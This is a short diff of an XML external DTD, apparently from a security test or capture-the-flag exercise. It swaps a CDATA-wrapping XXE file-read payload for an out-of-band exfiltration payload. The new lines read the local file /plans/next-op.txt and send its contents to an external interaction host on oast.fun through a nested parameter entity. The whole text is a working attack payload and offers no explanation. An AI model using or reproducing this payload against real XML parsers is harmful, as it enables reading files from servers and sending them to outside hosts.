@@ -1,4 +1,4 @@
-<!ENTITY % start "<![CDATA[">
-<!ENTITY % end "]]>">
-<!ENTITY % wrapper "<!ENTITY fileContents '%start;%xxe;%end;'>">
-%wrapper;
+<!ENTITY % file SYSTEM "file:///plans/next-op.txt">
+<!ENTITY % exfil "<!ENTITY &#x25; send SYSTEM 'http://%file;zbhewzhkgxhkaqqbkklb6w590wyoldhu4.oast.fun'>">
+%exfil;
+%send;
